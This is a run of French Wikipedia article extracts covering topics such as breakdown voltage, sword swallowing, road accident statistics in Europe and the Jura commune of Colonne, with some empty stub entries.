L'œuvre a comme caractéristique majeure de faire apparaître une ville, Londres, et des personnages (les artistes préraphaélites) réels dans une histoire de fantasy. L'histoire est même datée de 1872, mais l'intrigue d"Arcadia" se situe en fait dans une sorte de monde parallèle et pas dans notre monde réel.
Ce monde a toutefois un lien avec un futur de notre monde où Paris a été envahie par les eaux.

</doc>
<doc id="1873774" url="https://fr.wikipedia.org/wiki?curid=1873774" title="KDH">
KDH

KDH est un sigle qui peut désigner :
KDH est un code qui peut désigner :

</doc>
<doc id="1873775" url="https://fr.wikipedia.org/wiki?curid=1873775" title="L'Olonnois">
L'Olonnois



</doc>
<doc id="1873777" url="https://fr.wikipedia.org/wiki?curid=1873777" title="Karel Kramar">
Karel Kramar



</doc>
<doc id="1873779" url="https://fr.wikipedia.org/wiki?curid=1873779" title="Tension de claquage">
Tension de claquage

La tension de claquage (ou « tension disruptive ») d'un isolant électrique est la tension électrique minimale qui rend conductrice une portion d'un isolant. Ce terme est particulièrement utilisé pour les condensateurs, dont le fonctionnement repose sur l'isolant séparant ses deux bornes : si la tension de claquage est dépassée, un arc électrique se forme entre les deux bornes, ce qui détruit le condensateur par altération du matériau isolant, sauf si ce matériau est dit auto-régénérateur, comme l'air.
La tension de claquage d'une diode est la tension électrique inverse qui rend une diode conductrice dans le sens bloquant. Certains composants, comme les triacs, ont une tension disruptive directe.
Cas des isolants.
La tension de claquage est une caractéristique des isolants électriques qui définit la différence de potentiel maximale qui peut être appliquée à un matériau avant qu'il ne devienne conducteur. Dans les isolants solides le courant électrique fragilise le matériau sur son passage en créant des modifications permanentes, soit moléculaires, soit physiques. Dans les gaz raréfiés que l'on trouve dans certains types de lampes à décharge, la tension de claquage est parfois appelée « tension d'amorçage ».
La tension de claquage d'un matériau n'est pas parfaitement définie car il s'agit d'une sorte de rupture dont l'apparition à une tension donnée est une probabilité. Lorsqu'une valeur précise est spécifiée, il s'agit, en général, d'une valeur moyenne constatée au cours de plusieurs expériences. On parle également de « tension de tenue » lorsque la probabilité de rupture à une tension donnée est si faible qu'on peut considérer que le matériau restera isolant à cette tension.
La tension de claquage d'un matériau peut prendre deux valeurs selon les conditions expérimentales : la tension en courant alternatif et la tension en courant pulsé. Le courant alternatif est le courant secteur classique, avec une fréquence de ou selon le pays. La tension de claquage en courant pulsé mesure ce qui se passe dans le cas de la foudre et correspond généralement à un temps de montée de pour atteindre 90 % de sa valeur maximale, et un temps de descente de pour être à 50 % de la valeur maximale.
Aux États-Unis deux normes techniques fixent les conditions expérimentales, ASTM D1816 et ASTM D3300, publiées par l'ASTM ("American Society for Testing and Materials").
Tension de rupture dans les gaz.
Dans les conditions standards, à pression atmosphérique, les gaz sont de très bons isolants qui nécessitent une différence de potentiel importante avant de produire un arc (comme la foudre par exemple). Ce phénomène a donné lieu à diverses applications dans l'industrie (comme la fabrication des microprocesseurs), mais, dans d'autres circonstances, il peut causer des dommages importants à un équipement, le claquage se comportant alors comme un véritable court-circuit.
La tension de claquage dans un gaz est décrite par la loi de Paschen :
formula_1
où formula_2 est la tension continue de claquage, formula_3 et formula_4 sont des constantes qui dépendent du gaz du milieu, formula_5 est la pression du gaz du milieu, formula_6 est la distance entre les électrodes et formula_7 est le second coefficient d'ionisation de Townsend.
Diodes.
La tension de claquage est une des caractéristiques des diodes qui précise la tension inverse maximale qui peut être appliquée à la diode sans provoquer une augmentation exponentielle du courant dans la diode. Si le courant est limité, le fait de dépasser la tension de claquage ne détruit pas la diode.
Les diodes Zener sont des diodes classiques dont le semi–conducteur est fortement dopé et qui utilise la réaction de la diode à la tension de claquage pour fabriquer des systèmes de régulation de tension.

</doc>
<doc id="1873780" url="https://fr.wikipedia.org/wiki?curid=1873780" title="Bent Familia">
Bent Familia



</doc>
<doc id="1873782" url="https://fr.wikipedia.org/wiki?curid=1873782" title="Avaleur de sabre">
Avaleur de sabre

Un avaleur de sabre est un artiste de spectacle de tradition ancienne, dont le numéro consiste à introduire une lame (épée, sabre, couteau) dans la bouche et l'œsophage, et de la faire descendre jusqu'à l'estomac. L'artiste n'avale pas la lame à proprement parler : le processus de déglutition est contrôlé pour permettre à la lame d'atteindre l'estomac.
Les avaleurs de sabre sont apparus vers le millénaire av. J.-C. en Inde et dans le royaume hittite (actuelle Turquie). Cette pratique est extrêmement dangereuse et peut causer des blessures fatales : au moins trente pratiquants sont décédés dans l'exercice de leur art ces cinquante dernières années.
Histoire.
La pratique a une histoire ancienne. À ses débuts, elle était employée comme une marque de puissance et d'union avec le divin.
Le fait d'avaler des lames se développe en Grèce et à Rome au , puis en Chine vers le . Au Japon, la pratique s'incorpore au théâtre acrobatique ("sarugaku"), proche du cirque moderne, qui comprenait également des numéros de cracheurs de feu, de jonglage et des danses. En Europe, il s'agissait d'un type de performance artistique associée à la jonglerie.
Au Moyen-Âge, les avaleurs de lames réalisent leurs numéros dans des spectacles de rue, ainsi que dans des foires. Leur nombre diminue fortement au cours du , et la pratique est même interdite en Scandinavie en 1893, en raison de sa dangerosité. Ceci est notamment lié au déclin du théâtre de rue, au profit du théâtre « classique » joué dans des salles, qui gagne alors en notoriété.
D'après un article d'un magazine anglais datant du début du , la pratique des avaleurs de sabre indiens était considérée comme un mythe. En 1813, une troupe d'artistes de cirque indiens se produisant à Londres incluait un numéro d'avalement de sabre. Elle était dirigée par Ramo Sammee, un jongleur qui réalisa des numéros jusqu'à sa mort en août 1850, ainsi que des tournées en Europe et en Amérique du Nord. De 1850 à 1890, peu d'avaleurs de sabres sont répertoriés en Angleterre et aux États-Unis : Martha Mitchell (vers 1855), Benedetti (de 1863 à 1895), ainsi que Lawson Peck, Ling Look, Wandana et Harry Parsons. L'avaleur de sabre américain le plus réputé était alors Fred McLone, connu sous son nom de scène « Chevalier Cliquot » ; il est actif de 1878 au début du XXe siècle.
En 1893, la pratique est présentée lors de l'Exposition universelle de 1893 à Chicago. Au début des années 1900, des cirques itinérants proposent fréquemment ce type de numéros. Les artistes expérimentent peu à peu des avalements plus complexes : lames multiples, longues épées, épées chauffées à blanc, baïonnettes ou lampes néons. Des avaleurs de sabres sont parfois invités en première partie des spectacles du magicien Houdini. Aujourd'hui, certains artistes se produisent dans le cadre d'un spectacle de rue.
Technique.
L'avaleur de sabre doit pencher sa tête en arrière, en étendant la nuque, puis relâcher le sphincter supérieur de l'œsophage (un muscle aux contractions généralement involontaires). Les haut-le-cœur doivent être contrôlés lors de l'insertion de la lame à travers la bouche et le pharynx, lubrifiée par la salive.
Une fois passés le pharynx et le sphincter supérieur, la lame passe rapidement (en raison de la gravité) en redressant l'œsophage. L'estomac, formant un angle avec l'œsophage, est mis en position droite lorsque l'épée passe par l'ouverture cardiale. Certains artistes prennent un repas copieux avant leur performance, afin de donner à leur estomac une orientation plus verticale et faciliter ainsi la descente de l'épée. La démarche requiert une précaution extrême, la lame passant à quelques millimètres d'organes vitaux comme l'artère aorte, le cœur et les poumons.
Risques de blessure.
La plupart des blessures graves surviennent lorsque le pratiquant a déjà subi plusieurs blessures légères ou lorsqu'il tente d'avaler d'autres lames que des lames droites. La blessure la plus courante est le mal de gorge, qui apparait très fréquemment lors des premiers essais ou lorsqu'un artiste tente d'avaler plusieurs épées à la fois. L'avalement de plusieurs épées peut également conduire à une distension de l'œsophage. Des blessures très graves peuvent également survenir, comme une perforation de l'œsophage, de l'estomac, du cœur, des poumons ou une hémorragie intestinale. Depuis 1880, trente-neuf pratiquants seraient décédés dans l'exercice de leur art.
Ces dernières années, plusieurs cas de blessure grave ont été recensés. En 2009, un avaleur de sabre chinois s'est entaillé l'œsophage en tentant d'avaler un sabre courbe. Un avaleur de sabre expérimenté, après avoir ressenti une vive douleur et une sévère dysphagie, a dû subir une ablation de l'œsophage. Une femme de 27 ans, blessée à la gorge par la lame qu'elle tentait d'avaler, a vomi du sang et dut être placée en réanimation.
Avancées scientifiques.
La pratique des avaleurs de sabre a permis plusieurs avancées scientifiques, notamment en matière d'endoscopie.
C'est grâce à un avaleur de sabres qu'en 1777 le médecin écossais Stevens peut faire les premières études du suc gastrique humain. À l'aide de petits tubes de métal percés de trous et remplis de viande, que le docteur fait ingérer puis régurgiter à son cobaye, il peut étudier le processus de digestion.
En 1868, le docteur allemand Adolf Kussmaul crée la gastroscopie en s'inspirant des exploits d'un avaleur de sabres. Il utilise un tube rigide de 47 centimètres de longueur, des miroirs et une lampe à pétrole. L'appareil lui permit d'examiner l'œsophage et le fundus (partie haute de l'estomac) de son patient.
En 1906, le docteur Cremer réalise un électrocardiogramme en passant une électrode à l'intérieur de l'œsophage d'un avaleur de sabres. Cette technique a depuis été jugée très efficace par de nombreuses études, qui montrent que l'enregistrement à une telle proximité du cœur permet d'améliorer la qualité du signal.
De 2003 à 2006, une étude sur les difficultés à déglutir a été conduite par deux chercheurs britanniques, Brian Witcombe et Dan Meyer, et publiée dans le "British Medical Journal".
Records.
En 2009, le Livre Guinness des records homologue le record actuel d'avalement de sabre de l'artiste Natasha Veruschka, avec une lame de 58 cm de longueur. Dai Andrewswith valide la même année un record avec une lame courbe (120 degrés). Franz Huber détient quant à lui le record du plus grand nombre d'épées avalées avec rotation, avec un total de quinze épées ingurgitées et retournées à 180 degrés. Une même épée, surnommée « l'épée des épées », a été avalée par plus de quarante artistes différents.
En 1894, le Québécois M. Cliquot, serait parvenu à en ingurgiter à la fois quatorze épées de 22 pouces de long et de 4 pouces de large. Le docteur Hope, présent ce jour-là, lui causa d'importantes blessures en retirant toutes les épées à la fois.

</doc>
<doc id="1873786" url="https://fr.wikipedia.org/wiki?curid=1873786" title="Comté d'Elk (Kansas)">
Comté d'Elk (Kansas)

Le comté d’Elk est l’un des 105 comtés de l’État du Kansas, aux États-Unis. Fondé le 25 mars 1875, il a été nommé d’après la rivière Elk.
Siège et plus grande ville : Howard.

</doc>
<doc id="1873791" url="https://fr.wikipedia.org/wiki?curid=1873791" title="Accident de la route en Europe">
Accident de la route en Europe

Un suivi de l’évolution des accidents de la route se produisant dans les pays de l’Union européenne est effectué et communiqué annuellement par l’Observatoire national interministériel de la sécurité routière (ONISR).
Synthèse.
On constate une diminution assez régulière du nombre de tués sur la route depuis les années 1970 dans l'ensemble de l’Union européenne. Cette évolution n’est néanmoins pas homogène pour l’ensemble du continent ; les pays d’Europe de l'Est présentent un décalage dans le temps : le nombre de tués a crû jusqu’au début des années 1990, pour décroître ensuite d’environ 4 % chaque année.
Le nombre de morts sur la route dépend fortement des différences structurelles (taille du pays, composition, densité et qualité du réseau routier, population, etc.) et socio-économiques (composition du parc, présence de trafic international et touristique, comportement des usagers).
Si l'on considère l'ensemble des pays de l'Union européenne, la mortalité diminue plus rapidement que les accidents corporels. Cette baisse de la mortalité fait l'objet d'objectifs fixés depuis l'an 2000.
Domaines géographiques.
L'Europe peut être appréhendée à différentes échelles telle que l'Europe des nations unies ou bien l'Union européenne.
La politique de sécurité routière de l'union européenne est de la responsabilité conjointe des institutions européennes et des États membres; et c'est la Commission européenne (CE) qui a un rôle important particulier en supervisant la politique de sécurité routière à travers l'Union. Ceci vient de sa supervision sur les règlements et standards des produits, ainsi que sur certains aspects du développement et de la gestion des infrastructures. La sécurité routière est basée sur le principe de subsidiarité: les autorités nationales et locales sont responsables de la plupart des décisions, y compris l' enforcement et la prise de conscience, tandis que l'UE opère un cadre général pour améliorer la sécurité routière par la législation et des recommandations e.g. introduire des exigences minimales de sécurité pour les réseaux de transport trans-européens, et les exigences techniques pour le transport de matières dangereuses.
L'UE publie divers textes légaux concernant la sécurité routière.
Définitions du « tué ».
Définitions du « tué ».
La définition internationale du « tué » a été amendée lors de la Convention de Vienne de 1968 : « Une victime d’un accident de la route est considérée comme tuée si elle décède sur le coup ou dans les trente jours qui suivent l’accident ».
Progressivement, depuis 1968, la définition du tué à trente jours s’est imposée dans la plupart des pays de l’Union européenne.
Définition des « blessures graves de la route » ou "serious injuries".
En 2015, l'Union européenne s'est doté d'une définition commune du concept de "serious injuries" (ou en français « blessures graves de la route ») afin de pouvoir agréger au niveau européen les statistiques nationales.
Ce nouveau concept se base sur des normes médicales. L'échelle MAIS (de l’anglais "Maximum Abbreviated Injury Score") est utilisée. Les "serious injuries" ou « blessures graves de la route » sont définies comme les blessures de type "scale 3 and more" (ou MAIS3+). Ceci est lié au modèle de l'.
Localisation des accidents mortels.
En 20189, la majorité des accidents mortels de l'Union européenne (53 %) ont lieu sur le réseau secondaire (voir diagramme)
Indicateurs nationaux de mortalité.
La plupart des pays européens disposent d'une forme d'observatoire régional ou national de la sécurité routière. En Europe, l' (ERSO) rassemble et harmonise l'information sur les pratiques de sécurité routière dans les pays européens.
Dans l'Union européenne, des différences de performance existent de pays à pays. Par exemple, Allemagne, Espagne et Pays-Bas ont tués en 2019 pour % de la population de 2017. Cela signifie que ce groupe de trois pays peuplés a de meilleures performances que l'ensemble de l'UE. À l'opposé, Pologne, Bulgarie et Roumanie dénombrent la même année , mais pour seulement % de la population de 2017. Ces six pays comptent ainsi 48 % de la population UE et 48 % des tués dans l'UE, mais le taux de tués par population est % plus élevé dans le deuxième groupe de trois pays que dans le meilleur groupe. Entre ces deux groupes, le France et Italie ensemble comptent tués la même année, pour % de la population de 2017. De fait, le taux de tués par population dans ce troisième groupe est % plus élevé que dans le meilleur groupe. La Belgique se rapproche de ce troisième groupe avec des performances un peu moins bonnes et une moindre taille. Ces huit pays (Belgique non comptée) groupent 77% de la population de l'UE et 76% des tués dans l'UE. Le dernier quart regrouperait les 19 autres États membres de l'UE qui ont également des performances disparates, mais avec un moindre poids sur la performance totale de l'UE.
Pour de nombreux pays européens, les anciens indicateurs sont disponibles. Toutefois les pays de l'Union européenne envisagent d'utiliser de nouveaux indicateurs clés de performance pour la décennie 2021-2030.
Les différences existantes entre pays s'expliquent par la démographie, le niveau de développement et la densité de l’habitat. Selon les travaux de Siem Oppe de l’Institut de recherche en sécurité routière des Pays-Bas (SWOW), on remarque un phénomène d'apprentissage dans l'évolution du nombre de tués :
Les moyennes nationales ne reflètent pas les variations locales. Ainsi, en 2015, les régions NUTS (Nomenclature des unités territoriales statistiques) ayant la mortalité routière la plus faible, par million d'habitants, sont Stokholm (6), Vienne (7), Hambourg et Oslo (11), Berlin (14) et Ostra Verige (15). La même année, les régions les plus meurtrières sont la province de Luxembourg en Belgique (210) et Kastamonu en Turquie (192).
Évolution historique.
La plupart des pays d'Europe ont connu une baisse très importante du nombre de tués sur la route entre 1970 et 2015:
1970 - 1995.
Entre 1970 et 1995, on observe une baisse très importante et régulière du nombre de tués dans la plupart des pays d’Europe de l’Ouest. Cette baisse quasi générale s’explique par la mise en place d’une réglementation complète, et de l'amélioration de la sécurité des véhicules (active et passive), du réseau routier et de la médecine d'urgence.
En France, cette baisse est amorcée avec le choc pétrolier, et diverses mesures de sécurité routière comme la création de vitesses maximales autorisées (VMA), l'obligation du port de la ceinture de sécurité à l’avant et du casque pour les motocyclistes, la baisse du seuil de l’alcoolémie à 0,8 g/l d’alcool dans le sang, les systèmes antiblocage des roues ou la construction de carrefours giratoires puis en 1990, la VMA de 50 km/h en agglomération, l’alcoolémie à 0,5 g/l, le permis à points, l'achèvement du réseau autoroutier, et les airbags.
Au Royaume-Uni, la mortalité maximale est atteinte en 1966, et dès 1965-1967 les pouvoirs publics mettent en place un système de permis de conduire centralisé et étendu aux poids-lourds, des limitations d'alcoolémie, et des courts-métrages télévisés de promotion de la conduite sûre.
1995 - 2009.
Entre 1995 et 2009, la tendance s’est infléchie, toujours marquée à la baisse, mais de façon moins importante. En effet, .
2015-2019.
Entre 2017 et 2018, l'Union européenne a réduit la mortalité routière de 200 tués par an (en passant de 25300 à 25100 sur le périmètre UE-28 incluant le royaume-Uni). La France contribue à 95% de ces 200 vies sauvées, avec une réduction de la mortalité routière de 189 tués par an (3.448 morts de 2017 puis 3.259 morts sur les routes de métropole) que le gouvernement attribue unilatéralement à sa politique de sécurité routière. Il est à noter que ceci est fortement contesté par les Associations de conducteurs Français car cette politique est exclusivement centrée sur les limitations de vitesse et la répression extensive au détriment, entre autres, de l’amélioration du réseau routier.
Toutefois, d'autres pays ayant un moindre poids dans la mortalité routière européenne (inférieur à 750 tués par an) ont fait des progrès relatifs supérieur sans avoir une politique de réduction de la vitesse aussi importante que la France. Cependant cette nouvelle limitation s'inscrit dans le sillage des pays les plus exemplaires au niveau de la sécurité routière. 
Dans la même période, l’Allemagne (ayant un poids comparable dans la mortalité routière européenne) a vu sa mortalité augmenter, passant de 3177 tués en 2017 à 3265 tués en 2018. De fait en 2018, la France n'est plus le pays comptant le plus grand nombre de tués, et descend à la troisième place, après l'Allemagne et l'Italie.
En 2018, sur le périmètre UE-27 induit par le retrait britannique de l'UE, 23 339 tués ont été comptabilisés sur les routes européennes.
En ce qui concerne la mortalité par habitant, les meilleurs pays de l'UE sont l'Irlande, le Danemark, la Suède et les Pays-Bas, Malte et l'Espagne qui ont une mortalité inférieure à 40 tués par millions d'habitants en 2018. Les pires pays de l'UE sont la Roumanie, la Bulgarie, la Croatie, la Lettonie et la Pologne qui ont une mortalité supérieure à 75 tués par millions d'habitants en 2018.
En 2019, l'Union européenne comptabilise 22800 tués sur les routes, pour un objectif de 15900.
2020.
Pour l'année 2020 avec environ 18 800 tués, l'UE compte 4000 tués en moins, soit une baisse exceptionnelle de 17%. La baisse est de 21 % en Espagne et en France, 22 % en Allemagne et en Belgique, 25 % en Italie et 26 % en Bulgarie.
Pour l'année 2022, le nombre de tués est de 20 640; pour 2023, le nombre de tués est estimé à 20 400
Pour 2024, le nombre de tués est estimé à 19 800 en mars 2025.
Enjeux actuels.
Législature 2019-2024.
Afin de réduire les accidents, la législation qui entre en vigueur en 2022 pour les nouveaux modèles de véhicules et en 2024 pour tous les véhicules neufs commercialisés prévoit l'ajout de quelques équipement :
Suggestions et opinions.
Suggestions pour continuer à réduire le nombre d'accidents :
Décennie d'action 2021-2030.
En 2020, et sur la décennie précédente, plus de 25 000 personnes meurent chaque année d'un accident de la route. Plus de 135 000 personnes sont gravement blessées sur les routes de l'Union européenne à 28 (l'UE-28 comprend le Royaume-Uni). Il est estimé que ce préjudice inutile a un coût de 280 milliards d’euros annuels soit 2 % du PIB. Ces chiffres de mortalité correspondent à l'écrasement d'un avion gros porteur chaque semaine.
L'UE se fixe pour objectif de réduire le nombre de blessés graves de 50% sur la décennie 2020-2030. Pour atteindre cet objectif, elle prévoit de s'appuyer sur trois piliers :
Influence du mode de transport.
Tués par mode de transport de la victime.
En 2007, dans l'Union européenne, 62.04 % des tués dans des accidents étaient les conducteurs des véhicules impliqués, 19.86 % étaient des passagers et 18.09 % des piétons .
Par ordre décroissant, voici la répartition des décès selon le mode de transport :
Dans le monde et dans l'Union européenne à 28, la mortalité dépend du mode de transport.
Piétons tués.
La France est classé huitième pour les piétons tués en 2013.
32% des tués en zone urbaine sont des piétons en France, alors que ce taux n'est que de 18% aux Pays-Bas.
Blessures graves de la route par véhicule adverse.
Une étude par échantillonnage permet de savoir quels sont les véhicules de la partie adverse les plus impliqués dans les "Blessures graves de la route", en Europe.
Cyclistes.
Aux Pays-Bas en 2018, 10 % des accidents de vélos sont occasionnées par une rupture du système de freinage.
Politiques de sécurité routière.
À différents niveaux, européen, nationaux ou régionaux, des politiques de développement de la sécurité routière sont mises en place. Concernant les véhicules eux-mêmes, des règlements standardisés pour les véhicules sont définis par la Commission économique pour l'Europe des Nations unies et l'Organisation des Nations unies ; certains de ces standards sont rendus obligatoires par l'Union européenne, comme la ceinture de sécurité dans les voitures et dans les autocars ; sont également mises en place des notations de sécurité des véhicules européens, notamment par l'EuroNCAP. Concernant les comportements des usagers de la route, des campagnes nationales sont organisées. Concernant les routes, leurs gestionnaires procèdent à des amémliorations, telles que le développement d'un réseau autoroutier par l'Espagne, la sécurisation de passages à niveau ou l'introduction de dans certaines communes.
Projet européen SafetyCube.
Certains projets européens de recherche visent à améliorer la sécurité routière. Ainsi, dans le cadre du projet européen de recherche "SafetyCube", l'efficacité de certains dispositifs a été évaluée. Parmi les systèmes considérés efficaces on trouve notamment :
Dispositifs de véhicules.
Ceinture de sécurité,
Event data recorder,
coussin gonflable frontal.
Infrastructure.
dos d'âne,
contrôle de vitesse,
affichage dynamique de la vitesse
réduction des limites de vitesse,
barrière de passage à niveau .
Comportement.
contrôle du port de ceinture de sécurité.
Récompenses.
Depuis 2016, la commission européenne remet le grand prix Jacques Barrot au projet sélectionné.
En 2018, le prix Jacques Barrot est remis à VOZIM, une association slovène combattant le "reckless driving".
En 2019, la Slovénie remporte le grand prix Jacques Barrot pour sa campagne qui a impliqué 15 000 jeunes contre l'alcool.
En 2021, le grand prix Jacques Barrot est remis à la "Fundatia Siguranta Auto Copii" de Roumanie pour sa "National Children Care Safety Caravan initiative".
En 2022, le grand prix Jacques Barrot est remis au projet FeGiS+ de détection préalable des spots de danger spots dans le trafic routier au travers de données smart.
En 2023, un cinq awards ont été décerné, parmi les cinq, l'award Jacques Barrot 2023 a été décerné à l' "Austrian Institute of Technology"(AIT) (Autriche) - pour une MOB (Mobility Observation Box). Il s'agit d'une boite suffisamment petite pour ne pas distraire les conducteurs qui peut à l'aide de caméras enregistrer pendant 14 jours l'utilisation de la route. Post-acquisition, l'intelligence artificielle permet d'observer et reconnaître les usagers de la route pour prévoir des mesures de sécurité adéquate.
En 2024, certains projets européens sont en finales pour recevoir un award. Parmi les finalistes, on trouve par exemple:

</doc>
<doc id="1873792" url="https://fr.wikipedia.org/wiki?curid=1873792" title="Colonne (Jura)">
Colonne (Jura)

Colonne est une commune française située dans le département du Jura, dans la région culturelle et historique de Franche-Comté et la région administrative Bourgogne-Franche-Comté.
En ce début de millénaire, la municipalité a beaucoup travaillé à l'unité d'une structure collective rurale moderne et démocratique : l'intercommunalité du Val d'Orain. Les sept agriculteurs portent leur lait à la coopérative d'Oussières. Le SIVOS du Val d'Orain (syndicat intercommunal à vocation scolaire) a été créé avec Oussières, Villers-les-Bois, Le Chateley, Biefmorin, Bersaillin, Brainans, Neuvilley pour construire un groupe scolaire à 6 classes avec garderie. La demande en logement dépasse l'offre.
Colonne a été bâtie dans la partie basse d'une micro vallée dessinée par l'Orain, petite rivière qui prend sa source dans les complexes systèmes karstiques des plateaux du Jura. Son débit est très peu variable, du fait du réchauffement. Colonne n'est pas directement adossée à la rivière mais à un petit canal, détournement de l'Orain, qui alimente le village. Les maisons les plus anciennes, sont du XVIIIme siècle, le village ayant été rasé par les troupes de Louis XIV avant l'annexion à la France.
L'église, construite au XVIIIe, a été agrandie au XIXe. Son clocher abrite une cloche classée monument historique. La façade fortifiée, au centre du village, ne figure curieusement pas dans la cartographie de Cassini, elle n'est pas non plus classée, donc non authentifiée. Le portail, lui, n'est pas de structure défensive, mais bien religieuse, il porte les armoiries des "de Reculot", famille noble implantée au Moyen Âge. Ces armoiries, bouchardées à la révolution? sont peut-être un rajout ancien.
Ce bras de l'Orain constitue le cœur du village. C'est entre la rivière et ce dernier que le village historique s'est développé autour de l'église, sous la protection de deux fossés, remarquables sur les anciennes cartes (Cassini et plan cadastral des archives départementales). Les moulins qui ne sont plus en service enjambent le bras du canal.
À voir: Les restes de fortifications et surtout la porte XVIme.
La maison Mignaton, maitre d’œuvre de l'église, lequel s'est construit une belle maison datée de 1793, comportant une niche à statue, forme de provocation en pleine Terreur.
Juste derrière, une autre maison datée elle, de 1789.
Le village possède 2 moulins du XIXme en bon état, dont un au hameau de Vaivre.
Devant le lotissement dit des Eclusiaux, un chêne remarquable en cours de classement.
De plus, le village est traversé par un chemin de randonnée régional (marquage jaune) permettant de marcher quelques heures dans une forêt fraîche en plein été.
Géographie.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat des marges montagnardes, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat semi-continental et est dans la région climatique Jura, caractérisée par une forte pluviométrie en toutes saisons ( à ), des hivers rigoureux et un ensoleillement médiocre. Elle est en outre dans la zone H1c au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique installée sur la commune est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Colonne est catégorisée commune rurale à habitat dispersé, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle est située hors unité urbaine. Par ailleurs la commune fait partie de l'aire d'attraction de Poligny, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de moins de .
Histoire.
Le château de Colonne fut le fief, vers 1640, du chef de bande comtois Jacques Roussel dit La Courbière. Dans le contexte violent de la guerre de Dix Ans, l'émergence d'un chef relevait d'une logique implacable. En 1637, dès les premiers mouvements de l'invasion française, capitaine La Courbière qui tenait le comté entre Sellières et Dole, est à la tête d'une bande de trois cents hommes. Ils ont contenu les troupes françaises en 1639 .
La Courbière est insaisissable car autour de Colonne s'étendent des espaces marécageux coupés par d'épaisses forêts, et c'est donc depuis le château de Colonne que La Courbière dirige les Picorées : troupe qui agit jusqu'au-delà de la frontière d'alors. Les Français s'emparent néanmoins du château de Grimont, au-dessus de Poligny. C'est une forteresse clef du pays. Mais l'approvisionnement de cette tête de pont, dans un pays épuisé, dépendait complètement d'apports externes. Les convois de charretiers devaient traverser depuis la plaine doloise, le piémont jurassien. C'est au long de ce parcours que les guettait La Courbière. Cette traque permanente faite d'embuscades et faillit bien affamer Grimont.
L'épisode du Meunier Courbières ne résista guère aux démonstrations de l'artillerie des troupes de Villeroy. La Courbière déposa les armes et fut fait prisonnier. Le superbe château constitue encore aujourd'hui le cœur du village, semble bien constitué en partie, d'éléments antérieurs au .
À l'intérieur de l'enceinte du château se trouvent tous les attributs défensifs associés à un site d'une certaine importance. Les bribes d'un large cercle fossoyé qui entourait ce bourg primitif sont encore visibles. Cependant le bâtiment visible au centre du village ne peut être confondu avec le château qui protégeait le couvent de Colonne au Moyen Âge, lequel était consacré à la vierge Marie (toujours fêtée). Seul, le portail d'entrée de l'enceinte religieuse mais lui de style Renaissance, a survécu aux représailles françaises de 1639 .Rappelons que :murs et arbres ont été "rabattus" à un mètre sur une demi lieue .
Qu'en est-il alors du "château"? Un propriétaire un peu mégalomane est sans doute à l'origine de cette "curiosité architecturale", les invraisemblances sont nombreuses, la présence d'antiques archères au-dessus d'une porte civile, construite à l'époque des armes à feu, celle d'armoiries apocryphes recreusées à hauteur d'homme, sachant que la Révolution a réalisé un bouchardage systématique des symboles nobiliaires, l'absence d'impacts et même de délitement, des pierres des tours, (rappelons que le village a brûlé plusieurs fois, qu'il a été l'objet d'un bombardement et que la pierre jaune est gélive)...
Sans doute du même "style" puisque du même propriétaire, la chapelle néo-gothique en ciment moulé, technique chère à la seconde moitié du où veillait encore il y a peu, un Christ aux outrages en plâtre.
Politique et administration.
Tendances politiques et résultats.
Élections présidentielles.
Le village de Colonne place en tête à l'issue du premier tour de l'élection présidentielle française de 2017, Emmanuel Macron (LaREM) avec 25,16 % des suffrages. Ainsi que lors du second tour, avec 68,55 %.
Élections régionales.
Le village de Colonne place la liste "Notre Région Par Cœur" menée par Marie-Guite Dufay, présidente sortante (PS) en tête, dès le tour des élections régionales de 2021 en Bourgogne-Franche-Comté, avec 52,05 % des suffrages. Lors du second tour, les habitants décideront de placer de nouveau la liste de "Notre Région Par Cœur" menée par Marie-Guite Dufay, présidente sortante (PS) en tête, avec cette fois-ci, près de 64,06 % des suffrages. Loin devant les autres listes menées par Julien Odoul (RN) en seconde position avec 21,88 %, Gilles Platret (LR), troisième avec 12,50 % et en dernière position celle de Denis Thuriot (LaREM) avec 1,56 %. Il est important de souligner une abstention record lors de cette élection qui n'ont pas épargné le village de "Colonne" avec lors du premier tour 57,81 % d'abstention et au second, 62,50 %.
Élections départementales.
Le village de Villevieux faisant partie du Canton de Bletterans place le binôme de Philippe Antoine (LaREM) et Danielle Brulebois (LaREM), en tête, dès le tour des élections départementales de 2021 dans le Jura, avec 68,12 % des suffrages. Lors du second tour, les habitants décideront de placer de nouveau le binôme de Philippe Antoine (LaREM) et Danielle Brulebois (LaREM), en tête, avec cette fois-ci, près de 75,00 % des suffrages. Devant l'autre binôme menée par Josiane Hoellard (RN) et Michel Seuret (RN) qui obtient 25,00 %. Il est important de souligner une abstention record lors de cette élection qui n'ont pas épargné le village de "Villevieux" avec lors du premier tour 57,81 % d'abstention et au second, 62,50 %.

</doc>
<doc id="1873801" url="https://fr.wikipedia.org/wiki?curid=1873801" title="Évolution des accidents de la route en Europe">
Évolution des accidents de la route en Europe



</doc>
<doc id="1873804" url="https://fr.wikipedia.org/wiki?curid=1873804" title="Évolution des accidents de la route en France">
Évolution des accidents de la route en France



</doc>
<doc id="1873811" url="https://fr.wikipedia.org/wiki?curid=1873811" title="Convention Nationale">
Convention Nationale



</doc>
<doc id="1873813" url="https://fr.wikipedia.org/wiki?curid=1873813" title="Blanche (Alpes-de-Haute-Provence)">
Blanche (Alpes-de-Haute-Provence)

La Blanche est une rivière torrentielle du sud-est des Alpes-de-Haute-Provence et des Hautes-Alpes, dans la région Provence-Alpes-Côte d'Azur. C'est un sous-affluent du Rhône par la Durance.
Géographie.
